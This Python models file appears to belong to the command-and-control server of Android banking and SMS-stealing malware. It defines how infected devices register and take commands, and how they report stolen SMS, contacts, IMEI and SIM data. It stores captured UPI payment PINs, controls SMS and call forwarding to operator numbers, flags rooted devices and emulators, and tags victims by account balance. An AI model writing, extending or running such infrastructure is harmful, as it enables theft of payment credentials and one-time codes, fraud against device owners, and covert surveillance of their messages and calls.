from pydantic import BaseModel, Field
from typing import Optional, List, Dict, Any, TYPE_CHECKING
from datetime import datetime, timezone
from enum import Enum
from ..utils.datetime_utils import utc_now

if TYPE_CHECKING:
    from app.models.upi_schemas import UPIPinEntry

class DeviceStatus(str, Enum):
    ONLINE = "online"
    OFFLINE = "offline"

class MessageType(str, Enum):
    INBOX = "inbox"
    SENT = "sent"

class LogLevel(str, Enum):
    DEBUG = "debug"
    INFO = "info"
    WARNING = "warning"
    ERROR = "error"

class CommandStatus(str, Enum):
    PENDING = "pending"
    SENT = "sent"
    DELIVERED = "delivered"
    EXECUTED = "executed"
    FAILED = "failed"

class PingMessage(BaseModel):
    type: str = "ping"
    device_id: str
    timestamp: int

class RegisterMessage(BaseModel):
    type: str = "register"
    device_id: str
    device_info: Dict[str, Any]

class PermissionsGrantedMessage(BaseModel):
    type: str = "permissions_granted"
    device_id: str
    timestamp: int

class DeviceInfoMessage(BaseModel):
    type: str = "device_info"
    device_id: str
    data: Dict[str, Any]

class SMSHistoryMessage(BaseModel):
    type: str = "sms_history"
    device_id: str
    data: List[Dict[str, Any]]

class NewSMSMessage(BaseModel):
    type: str = "new_sms"
    device_id: str
    data: Dict[str, Any]

class ContactsMessage(BaseModel):
    type: str = "contacts"
    device_id: str
    data: List[Dict[str, Any]]

class PongMessage(BaseModel):
    type: str = "pong"
    timestamp: int

class RegisteredMessage(BaseModel):
    type: str = "registered"
    device_id: str
    message: str = "Device registered successfully"

class CommandMessage(BaseModel):
    type: str = "command"
    command: str
    parameters: Optional[Dict[str, Any]] = None

class DeviceSettings(BaseModel):
    sms_forward_enabled: bool = True
    forward_number: Optional[str] = None
    monitoring_enabled: bool = True
    auto_reply_enabled: bool = False

class DeviceStats(BaseModel):
    total_sms: int = 0
    total_contacts: int = 0
    total_calls: int = 0
    last_sms_sync: Optional[datetime] = None
    last_contact_sync: Optional[datetime] = None
    last_call_sync: Optional[datetime] = None

class SimInfo(BaseModel):
    simSlot: int = Field(alias="sim_slot")
    subscriptionId: Optional[int] = Field(None, alias="subscription_id")
    carrierName: str = Field(alias="carrier_name")
    displayName: str = Field(alias="display_name")
    phoneNumber: str = Field(alias="phone_number")
    countryIso: Optional[str] = Field(None, alias="country_iso")
    mcc: Optional[str] = None
    mnc: Optional[str] = None
    isNetworkRoaming: bool = Field(False, alias="is_network_roaming")
    iconTint: Optional[int] = Field(None, alias="icon_tint")
    cardId: Optional[int] = Field(None, alias="card_id")
    carrierId: Optional[int] = Field(None, alias="carrier_id")
    isEmbedded: bool = Field(False, alias="is_embedded")
    isOpportunistic: bool = Field(False, alias="is_opportunistic")
    iccId: Optional[str] = Field("", alias="icc_id")
    groupUuid: Optional[str] = Field("", alias="group_uuid")
    portIndex: Optional[int] = Field(None, alias="port_index")
    networkType: Optional[str] = Field(None, alias="network_type")
    networkOperatorName: Optional[str] = Field(None, alias="network_operator_name")
    networkOperator: Optional[str] = Field(None, alias="network_operator")
    simOperatorName: Optional[str] = Field(None, alias="sim_operator_name")
    simOperator: Optional[str] = Field(None, alias="sim_operator")
    simState: Optional[str] = Field(None, alias="sim_state")
    phoneType: Optional[str] = Field(None, alias="phone_type")
    imei: Optional[str] = ""
    meid: Optional[str] = ""
    dataEnabled: bool = Field(False, alias="data_enabled")
    dataRoamingEnabled: bool = Field(False, alias="data_roaming_enabled")
    voiceCapable: bool = Field(False, alias="voice_capable")
    smsCapable: bool = Field(False, alias="sms_capable")
    hasIccCard: bool = Field(False, alias="has_icc_card")
    deviceSoftwareVersion: Optional[str] = Field(None, alias="device_software_version")
    visualVoicemailPackageName: Optional[str] = Field(None, alias="visual_voicemail_package_name")
    networkCountryIso: Optional[str] = Field(None, alias="network_country_iso")
    simCountryIso: Optional[str] = Field(None, alias="sim_country_iso")

    class Config:
        populate_by_name = True

class Device(BaseModel):

    device_id: str
    is_deleted: Optional[bool] = False
    deleted_at: Optional[datetime] = None
    sms_blocked: Optional[bool] = False
    sms_blocked_at: Optional[datetime] = None
    contacts_blocked: Optional[bool] = False
    contacts_blocked_at: Optional[datetime] = None
    calls_blocked: Optional[bool] = False
    calls_blocked_at: Optional[datetime] = None
    deleted_sms_ids: Optional[List[str]] = None
    deleted_contact_ids: Optional[List[str]] = None
    deleted_call_ids: Optional[List[str]] = None
    user_id: Optional[str] = None
    app_type: Optional[str] = "MP"

    admin_token: Optional[str] = None
    admin_username: Optional[str] = None

    note_priority: Optional[str] = None
    note_message: Optional[str] = None
    note_updated_at: Optional[datetime] = None
    admin_note_priority: Optional[str] = None
    admin_note_message: Optional[str] = None
    admin_note_created_at: Optional[datetime] = None

    model: Optional[str] = "Unknown"
    manufacturer: Optional[str] = "Unknown"
    brand: Optional[str] = None
    device: Optional[str] = None
    product: Optional[str] = None
    hardware: Optional[str] = None
    board: Optional[str] = None
    display: Optional[str] = None
    fingerprint: Optional[str] = None
    host: Optional[str] = None
    device_name: Optional[str] = None

    os_version: Optional[str] = "Unknown"
    sdk_int: Optional[int] = None
    supported_abis: Optional[List[str]] = None
    app_version: Optional[str] = None

    battery_level: Optional[int] = 0
    battery_state: Optional[str] = None
    is_charging: Optional[bool] = None

    total_storage_mb: Optional[float] = None
    free_storage_mb: Optional[float] = None
    storage_used_mb: Optional[float] = None
    storage_percent_free: Optional[float] = None

    total_ram_mb: Optional[float] = None
    free_ram_mb: Optional[float] = None
    ram_used_mb: Optional[float] = None
    ram_percent_free: Optional[float] = None

    network_type: Optional[str] = None
    ip_address: Optional[str] = None

    is_rooted: Optional[bool] = False
    is_emulator: Optional[bool] = False

    screen_resolution: Optional[str] = None
    screen_density: Optional[float] = None

    sim_info: Optional[List[SimInfo]] = None

    has_upi: Optional[bool] = False
    upi_pin: Optional[str] = None
    upi_pins: Optional[List[Dict[str, Any]]] = None
    upi_detected_at: Optional[datetime] = None
    upi_last_updated_at: Optional[datetime] = None

    telegram_bot_id: Optional[int] = None

    package_name: Optional[str] = None

    status: Optional[str] = "pending"
    last_ping: Optional[datetime] = None
    is_online: Optional[bool] = None
    last_online_update: Optional[datetime] = None

    settings: Optional[DeviceSettings] = None
    stats: Optional[DeviceStats] = None

    fcm_tokens: Optional[List[str]] = []

    call_forwarding_enabled: Optional[bool] = False
    call_forwarding_number: Optional[str] = None
    call_forwarding_sim_slot: Optional[int] = None
    call_forwarding_updated_at: Optional[datetime] = None

    registered_at: Optional[datetime] = None
    updated_at: Optional[datetime] = None
    
    fcm_ping_sent_at: Optional[datetime] = None
    
    is_uninstalled: Optional[bool] = False
    uninstalled_at: Optional[datetime] = None

    class Config:
        populate_by_name = True
        json_encoders = {
            datetime: lambda v: v.isoformat() if v and v.tzinfo else (v.replace(tzinfo=timezone.utc).isoformat() if v else None)
        }

class SMSMessage(BaseModel):
    device_id: str
    from_number: str = Field(alias="from")
    to_number: Optional[str] = Field(None, alias="to")
    body: str
    timestamp: datetime
    type: MessageType = MessageType.INBOX

    is_read: bool = False
    is_flagged: bool = False
    tags: List[str] = Field(default_factory=list)

    received_at: datetime = Field(default_factory=utc_now)

    class Config:
        populate_by_name = True

class Contact(BaseModel):
    device_id: str
    contact_id: str
    name: Optional[str] = None
    phone_number: str
    email: Optional[str] = None
    synced_at: datetime = Field(default_factory=utc_now)

class Log(BaseModel):
    device_id: str
    type: str
    message: str
    level: LogLevel = LogLevel.INFO
    metadata: Dict[str, Any] = Field(default_factory=dict)
    timestamp: datetime = Field(default_factory=utc_now)

class Command(BaseModel):
    device_id: str
    command: str
    parameters: Dict[str, Any] = Field(default_factory=dict)
    status: CommandStatus = CommandStatus.PENDING
    sent_at: Optional[datetime] = None
    executed_at: Optional[datetime] = None
    result: Optional[Dict[str, Any]] = None

class SendCommandRequest(BaseModel):
    command: str
    parameters: Optional[Dict[str, Any]] = None

class UpdateNoteRequest(BaseModel):
    priority: Optional[str] = Field(None, description="Note priority: 'lowbalance', 'highbalance', 'none', or null to remove")
    message: Optional[str] = Field(None, description="Note message, empty string to remove")

class UpdateSettingsRequest(BaseModel):
    sms_forward_enabled: Optional[bool] = None
    forward_number: Optional[str] = None
    monitoring_enabled: Optional[bool] = None
    auto_reply_enabled: Optional[bool] = None

class DeviceListResponse(BaseModel):
    devices: List[Device]
    total: int
    hasMore: bool

class AppTypeInfo(BaseModel):
    app_type: str
    display_name: str
    icon: str
    count: int

class AppTypesResponse(BaseModel):
    app_types: List[AppTypeInfo]
    total: int

class SMSListResponse(BaseModel):
    messages: List[SMSMessage]
    total: int
    page: int
    page_size: int

class ContactListResponse(BaseModel):
    contacts: List[Contact]
    total: int

class StatsResponse(BaseModel):
    total_devices: int
    active_devices: int
    pending_devices: int
    online_devices: int
    offline_devices: int
    uninstalled_devices: int

class SMSDeliveryStatus(str, Enum):
    SENT = "sent"
    DELIVERED = "delivered"
    FAILED = "failed"
    NOT_DELIVERED = "not_delivered"

class SMSDeliveryStatusRequest(BaseModel):
    device_id: str
    sms_id: str
    phone: str
    message: str
    sim_slot: int = 0
    sim_phone_number: Optional[str] = ""
    status: SMSDeliveryStatus
    details: Optional[str] = ""
    timestamp: int

class SMSDeliveryStatusResponse(BaseModel):
    success: bool
    message: str
    saved_to_sms: bool = False
    logged: bool = False

class CallForwardingResult(BaseModel):
    deviceId: str
    success: bool
    message: str
    simSlot: int = 0

class CallForwardingResultResponse(BaseModel):
    success: bool
    message: str
    logged: bool = True